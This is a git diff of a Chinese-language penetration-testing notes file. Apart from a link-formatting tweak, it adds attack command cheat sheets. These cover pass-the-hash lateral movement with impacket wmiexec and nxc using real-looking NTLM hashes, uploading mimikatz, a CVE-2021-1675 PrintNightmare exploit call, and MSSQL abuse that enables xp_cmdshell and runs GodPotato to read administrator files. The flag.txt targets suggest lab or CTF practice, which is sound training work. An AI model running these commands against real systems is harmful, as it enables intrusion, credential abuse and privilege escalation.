@@ -443,8 +443,8 @@ Ladon url.txt pythonpoc.ini
 # proxy 代理
 
 [ICMP/TCP 隧道 | 内网代理和穿透工具的分析记录](https://mp.weixin.qq.com/s/jpmi7CfvcOmL4qkSBKLvKQ)
-[ICMP隧道 | ICMP协议隧道穿透之pingtunnel](https://mp.weixin.qq.com/s/7nrLU_QcDGpotz77n-NsKQ)
-[ICMP隧道 | 内网知识之ICMP隧道搭建](https://mp.weixin.qq.com/s/lPiYez6ZrVqlRg54dOG4Tg)
+[ICMP 隧道 | ICMP 协议隧道穿透之 pingtunnel](https://mp.weixin.qq.com/s/7nrLU_QcDGpotz77n-NsKQ)
+[ICMP 隧道 | 内网知识之 ICMP 隧道搭建](https://mp.weixin.qq.com/s/lPiYez6ZrVqlRg54dOG4Tg)
 [DNS 隧道 | Cobalt Strike 的使用（二）](https://mp.weixin.qq.com/s/qLtfmiBVEb9pEfmcAb0RMw)
 [Linux 或 Windows 上实现端口映射](https://mp.weixin.qq.com/s/V9iw_Z0B-dTJikvnwLUEAQ)
 [内网代理和穿透工具的分析记录 | Vemon](https://mp.weixin.qq.com/s/pV9nQ6uzLTT2cqO1ZaJz6w)
@@ -1073,12 +1073,47 @@ sc start gupdate
 | smbexec.py | impacket-smbexec |
 |            |                  |
 
+## impacket/wmiexec.py/nxc
+
+```sh
+ lcd {path}                 - changes the current local directory to {path}
+ exit                       - terminates the server process (and this session)
+ lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
+ lget {file}                 - downloads pathname to the current local dir
+ ! {cmd}                    - executes a local shell cmd
+
+proxychains impacket-wmiexec pentest.me/Administrator@172.24.7.43 -hashes :5d0f79eaf7a6c0ad70bcfce6522d2da1
+proxychains -q nxc smb 172.24.7.43  -u Administrator -H 5d0f79eaf7a6c0ad70bcfce6522d2da1 -x 'type C:\Users\userb\Desktop\flag.txt' --codec GBK
+proxychains python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fbe5588a79e40d41d77a40569c7b3090 nasa.gov/administrator@10.10.10.140 -codec gbk
+proxychains python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
+
+## 上传文件
+lput /tmp/m/mimilib.dll .
+lput /tmp/m/mimispool.dll .
+lput /tmp/m/mimikatz.exe .
+## 下载文件
+lget ./file
+```
+
 ## impacket/smb-server
 
 ```sh
 # 本机启动smb, 可通过 IP\smb 访问本机目录
 impacket-smbserver smb /tmp/
 python3 CVE-2021-1675.py hacker.test/win10:ShiJinBuShi@192.168.110.110 '\\192.168.110.132\smb\sjbs.dll'
+```
+
+## impacket/mssql/nxc
+
+```sh
+proxychains4 -q nxc mssql 172.26.8.16 -u sa -p sqlserver_2022 --local-auth -x whoami
+proxychains4 -q nxc mssql 172.26.8.16 -u sa -p sqlserver_2022 --local-auth --put-file '/home/kali/GodPotato-NET4.exe' C:\\Windows\\Temp\\GodPotato-NET40.exe
+proxychains4 -q nxc mssql 172.26.8.16 -u sa -p sqlserver_2022 --local-auth -x 'C:\\Windows\\Temp\\GodPotato-NET40.exe -cmd "cmd /c type \"C:\Users\Administrator\Desktop\flag.txt\""'
+
+proxychains impacket-mssqlclient sa:'sqlserver_2022'@172.26.8.16
+## 开启 xp_cmdshell
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+exec xp_cmdshell 'dir c:\'
 ```
 
 ## mstsc
